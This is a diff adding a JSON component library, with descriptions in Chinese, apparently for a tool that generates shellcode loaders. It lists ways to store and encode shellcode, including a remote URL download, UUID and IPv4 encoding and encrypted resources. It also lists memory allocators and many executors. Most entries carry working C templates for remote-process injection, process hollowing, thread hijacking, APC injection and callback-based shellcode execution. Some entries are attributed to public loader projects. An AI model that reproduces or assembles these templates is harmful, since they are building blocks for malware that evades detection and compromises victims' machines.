@@ -1,0 +1,480 @@
+{
+  "version": "1.1",
+  "last_updated": "2026-03-06T12:00:00.000000",
+  "techniques": [],
+  "component_library": {
+    "storage_methods": [
+      {
+        "id": "embedded",
+        "name": "内部嵌入",
+        "description": "Shellcode直接编译到exe中",
+        "complexity": "simple"
+      },
+      {
+        "id": "resource",
+        "name": "资源段",
+        "description": "Shellcode存储在PE资源段",
+        "complexity": "simple"
+      },
+      {
+        "id": "remote_url",
+        "name": "远程URL",
+        "description": "从远程服务器下载",
+        "complexity": "medium",
+        "apis": [
+          "WinHttpOpen",
+          "WinHttpConnect",
+          "WinHttpOpenRequest",
+          "WinHttpSendRequest",
+          "WinHttpReceiveResponse",
+          "WinHttpReadData"
+        ]
+      },
+      {
+        "id": "local_file",
+        "name": "本地文件",
+        "description": "从本地文件读取",
+        "complexity": "simple",
+        "apis": [
+          "CreateFile",
+          "ReadFile",
+          "GetFileSize"
+        ]
+      },
+      {
+        "id": "encrypted_resource",
+        "name": "加密资源段",
+        "description": "加密后存储在资源段",
+        "complexity": "complex",
+        "apis": [
+          "FindResource",
+          "LoadResource",
+          "LockResource",
+          "SizeofResource"
+        ]
+      },
+      {
+        "id": "uuid_encoded",
+        "name": "UUID编码",
+        "description": "将shellcode编码为UUID字符串格式",
+        "complexity": "medium",
+        "apis": [
+          "UuidFromStringA"
+        ]
+      },
+      {
+        "id": "ipv4_encoded",
+        "name": "IPv4编码",
+        "description": "将shellcode编码为IPv4地址格式",
+        "complexity": "medium",
+        "apis": [
+          "inet_pton"
+        ]
+      },
+      {
+        "id": "base64_encoded",
+        "name": "Base64编码",
+        "description": "Base64编码存储shellcode",
+        "complexity": "simple",
+        "apis": [
+          "CryptStringToBinaryA"
+        ]
+      },
+      {
+        "name": "Registry存储",
+        "description": "将shellcode存储在Windows注册表中",
+        "complexity": "medium",
+        "apis": [
+          "RegOpenKeyEx",
+          "RegSetValueEx",
+          "RegQueryValueEx"
+        ],
+        "id": "sto_009"
+      },
+      {
+        "name": "远程URL下载",
+        "description": "从远程服务器下载shellcode，支持分段加载",
+        "complexity": "medium",
+        "apis": [
+          "InternetOpenA",
+          "InternetConnectA",
+          "HttpOpenRequestA",
+          "HttpSendRequestA",
+          "InternetReadFile"
+        ],
+        "id": "sto_010",
+        "source": "github: chainski/PandaLoader, tehstoni/tryharder"
+      }
+    ],
+    "memory_allocators": [
+      {
+        "id": "VirtualAlloc",
+        "name": "VirtualAlloc",
+        "description": "标准Windows内存分配",
+        "apis": [
+          "VirtualAlloc",
+          "VirtualFree"
+        ],
+        "complexity": "simple",
+        "code_template": "LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\nVirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);"
+      },
+      {
+        "id": "HeapCreate",
+        "name": "HeapCreate",
+        "description": "在堆上分配可执行内存",
+        "apis": [
+          "HeapCreate",
+          "HeapAlloc",
+          "HeapDestroy"
+        ],
+        "complexity": "medium",
+        "code_template": "HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\nLPVOID addr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);\nmemcpy(addr, shellcode, size);"
+      },
+      {
+        "id": "NtAllocateVirtualMemory",
+        "name": "NtAllocateVirtualMemory",
+        "description": "使用NTDLL底层API分配内存",
+        "apis": [
+          "NtAllocateVirtualMemory",
+          "NtProtectVirtualMemory"
+        ],
+        "complexity": "complex",
+        "code_template": "PVOID addr = NULL;\nSIZE_T regionSize = size;\nNtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\nNtProtectVirtualMemory(GetCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);"
+      },
+      {
+        "id": "MappedFile",
+        "name": "内存映射文件",
+        "description": "通过文件映射申请内存",
+        "apis": [
+          "CreateFileMapping",
+          "MapViewOfFile"
+        ],
+        "complexity": "medium",
+        "code_template": "HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size, NULL);\nLPVOID addr = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);\nmemcpy(addr, shellcode, size);"
+      },
+      {
+        "id": "VirtualAllocEx",
+        "name": "VirtualAllocEx",
+        "description": "在目标进程中分配内存(注入)",
+        "apis": [
+          "OpenProcess",
+          "VirtualAllocEx",
+          "WriteProcessMemory"
+        ],
+        "complexity": "complex",
+        "code_template": "HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nLPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nWriteProcessMemory(hProcess, addr, shellcode, size, NULL);\nVirtualProtectEx(hProcess, addr, size, PAGE_EXECUTE_READ, &oldProtect);"
+      },
+      {
+        "name": "NtMapViewOfSection",
+        "description": "使用Section对象映射内存，跨进程共享内存",
+        "complexity": "complex",
+        "apis": [
+          "NtCreateSection",
+          "NtMapViewOfSection",
+          "NtUnmapViewOfSection"
+        ],
+        "id": "mem_006"
+      }
+    ],
+    "data_copiers": [
+      {
+        "id": "memcpy",
+        "name": "memcpy",
+        "description": "标准C内存复制",
+        "complexity": "simple",
+        "code_template": "memcpy(dest, src, size);"
+      },
+      {
+        "id": "RtlMoveMemory",
+        "name": "RtlMoveMemory",
+        "description": "Windows API内存复制",
+        "apis": [
+          "RtlMoveMemory"
+        ],
+        "complexity": "simple",
+        "code_template": "RtlMoveMemory(dest, src, size);"
+      },
+      {
+        "id": "loop_copy",
+        "name": "循环字节复制",
+        "description": "逐字节复制，可用于解密同时复制",
+        "complexity": "simple",
+        "code_template": "for (size_t i = 0; i < size; i++) {\n    dest[i] = src[i] ^ key[i % keyLen]; // XOR解密示例\n}"
+      },
+      {
+        "id": "NtWriteVirtualMemory",
+        "name": "NtWriteVirtualMemory",
+        "description": "使用syscall写入内存",
+        "apis": [
+          "NtWriteVirtualMemory"
+        ],
+        "complexity": "complex",
+        "code_template": "SIZE_T bytesWritten;\nNtWriteVirtualMemory(hProcess, dest, src, size, &bytesWritten);"
+      }
+    ],
+    "executors": [
+      {
+        "id": "function_pointer",
+        "name": "函数指针",
+        "description": "直接转换为函数指针调用",
+        "complexity": "simple",
+        "code_template": "((void(*)())addr)();"
+      },
+      {
+        "id": "CreateThread",
+        "name": "CreateThread",
+        "description": "创建新线程执行",
+        "apis": [
+          "CreateThread",
+          "WaitForSingleObject"
+        ],
+        "complexity": "simple",
+        "code_template": "HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);\nWaitForSingleObject(hThread, INFINITE);"
+      },
+      {
+        "id": "callback_enumwindows",
+        "name": "EnumWindows回调",
+        "description": "通过EnumWindows回调执行",
+        "apis": [
+          "EnumWindows"
+        ],
+        "complexity": "medium",
+        "code_template": "EnumWindows((WNDENUMPROC)addr, NULL);"
+      },
+      {
+        "id": "callback_enumchildwindows",
+        "name": "EnumChildWindows回调",
+        "description": "通过EnumChildWindows回调执行",
+        "apis": [
+          "EnumChildWindows",
+          "GetDesktopWindow"
+        ],
+        "complexity": "medium",
+        "code_template": "EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)addr, NULL);"
+      },
+      {
+        "id": "APC",
+        "name": "APC队列",
+        "description": "通过APC队列执行(需挂起线程)",
+        "apis": [
+          "QueueUserAPC",
+          "SleepEx"
+        ],
+        "complexity": "medium",
+        "code_template": "QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), 0);\nSleepEx(0, TRUE);"
+      },
+      {
+        "id": "APC_injection",
+        "name": "APC注入",
+        "description": "通过APC注入到挂起进程",
+        "apis": [
+          "CreateProcess",
+          "QueueUserAPC",
+          "ResumeThread"
+        ],
+        "complexity": "complex",
+        "code_template": "STARTUPINFO si = { sizeof(si) };\nPROCESS_INFORMATION pi;\nCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\nQueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);\nResumeThread(pi.hThread);"
+      },
+      {
+        "id": "Fiber",
+        "name": "Fiber",
+        "description": "通过Fiber切换执行",
+        "apis": [
+          "ConvertThreadToFiber",
+          "CreateFiber",
+          "SwitchToFiber"
+        ],
+        "complexity": "medium",
+        "code_template": "ConvertThreadToFiber(NULL);\nLPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL);\nSwitchToFiber(fiber);"
+      },
+      {
+        "id": "CreateRemoteThread",
+        "name": "CreateRemoteThread",
+        "description": "在目标进程中创建远程线程",
+        "apis": [
+          "CreateRemoteThread",
+          "OpenProcess"
+        ],
+        "complexity": "complex",
+        "code_template": "HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nHANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);"
+      },
+      {
+        "id": "SetThreadContext",
+        "name": "SetThreadContext",
+        "description": "修改线程上下文执行(进程镂空)",
+        "apis": [
+          "CreateProcess",
+          "GetThreadContext",
+          "SetThreadContext",
+          "ResumeThread"
+        ],
+        "complexity": "complex",
+        "code_template": "// Process hollowing variant\nCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nGetThreadContext(pi.hThread, &ctx);\n// Modify RIP to point to shellcode\nctx.Rip = (DWORD64)addr;\nSetThreadContext(pi.hThread, &ctx);\nResumeThread(pi.hThread);"
+      },
+      {
+        "id": "callback_timer",
+        "name": "Timer回调",
+        "description": "通过SetTimer回调执行shellcode",
+        "apis": [
+          "SetTimer",
+          "MsgWaitForMultipleObjects"
+        ],
+        "complexity": "medium",
+        "code_template": "SetTimer(NULL, 0, 0, (TIMERPROC)addr);\nMsgWaitForMultipleObjects(0, NULL, FALSE, 100, QS_ALLINPUT);"
+      },
+      {
+        "id": "callback_enumdesktops",
+        "name": "EnumDesktopsW回调",
+        "description": "通过EnumDesktopsW回调执行",
+        "apis": [
+          "EnumDesktopsW",
+          "GetThreadDesktop"
+        ],
+        "complexity": "medium",
+        "code_template": "EnumDesktopsW(GetThreadDesktop(GetCurrentThreadId()), (DESKTOPENUMPROCW)addr, NULL);"
+      },
+      {
+        "id": "thread_hijacking",
+        "name": "线程劫持",
+        "description": "劫持现有线程执行shellcode",
+        "apis": [
+          "OpenThread",
+          "SuspendThread",
+          "GetThreadContext",
+          "SetThreadContext",
+          "ResumeThread"
+        ],
+        "complexity": "complex",
+        "code_template": "HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);\nSuspendThread(hThread);\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nGetThreadContext(hThread, &ctx);\nctx.Rip = (DWORD64)addr;\nSetThreadContext(hThread, &ctx);\nResumeThread(hThread);"
+      },
+      {
+        "id": "NtCreateThreadEx",
+        "name": "NtCreateThreadEx",
+        "description": "使用NTDLL底层API创建线程",
+        "apis": [
+          "NtCreateThreadEx"
+        ],
+        "complexity": "complex",
+        "code_template": "typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(\n    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,\n    LPTHREAD_START_ROUTINE, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID);\npNtCreateThreadEx NtCTE = (pNtCreateThreadEx)GetProcAddress(\n    GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\");\nHANDLE hThread;\nNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),\n    (LPTHREAD_START_ROUTINE)addr, NULL, FALSE, 0, 0, 0, NULL);"
+      },
+      {
+        "name": "CertEnumSystemStore回调",
+        "description": "通过证书存储枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CertEnumSystemStore",
+          "CertOpenStore"
+        ],
+        "id": "exe_014"
+      },
+      {
+        "name": "CopyFileEx回调",
+        "description": "通过CopyFileEx的进度回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CopyFileEx",
+          "CancelIo"
+        ],
+        "id": "exe_015"
+      },
+      {
+        "name": "CreateThreadPoolWait回调",
+        "description": "通过线程池等待对象的回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CreateThreadpoolWait",
+          "SetThreadpoolWait",
+          "WaitForThreadpoolWaitCallbacks"
+        ],
+        "id": "exe_016"
+      },
+      {
+        "name": "CreateTimerQueueTimer回调",
+        "description": "通过定时器队列定时器回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CreateTimerQueue",
+          "CreateTimerQueueTimer",
+          "DeleteTimerQueue"
+        ],
+        "id": "exe_017",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "CryptEnumOIDInfo回调",
+        "description": "通过加密对象标识符枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "CryptEnumOIDInfo"
+        ],
+        "id": "exe_018",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EnumCalendarInfo回调",
+        "description": "通过日历信息枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumCalendarInfo",
+          "EnumCalendarInfoEx"
+        ],
+        "id": "exe_019",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EnumDisplayMonitors回调",
+        "description": "通过显示器枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumDisplayMonitors",
+          "GetMonitorInfo"
+        ],
+        "id": "exe_020",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "EnumFontFamilies回调",
+        "description": "通过字体族枚举回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "EnumFontFamiliesW",
+          "EnumFontFamiliesExW"
+        ],
+        "id": "exe_021",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "FlsAlloc回调",
+        "description": "通过Fiber本地存储分配回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "FlsAlloc",
+          "FlsSetValue"
+        ],
+        "id": "exe_022",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "ImageGetDigestStream回调",
+        "description": "通过图像摘要流回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "ImageGetDigestStream"
+        ],
+        "id": "exe_023",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      },
+      {
+        "name": "SetupCommitFileQueueW回调",
+        "description": "通过安装文件队列提交回调执行shellcode",
+        "complexity": "medium",
+        "apis": [
+          "SetupOpenFileQueue",
+          "SetupCommitFileQueueW"
+        ],
+        "id": "exe_024",
+        "source": "github: aahmad097/AlternativeShellcodeExec"
+      }
+    ]
+  }
+}
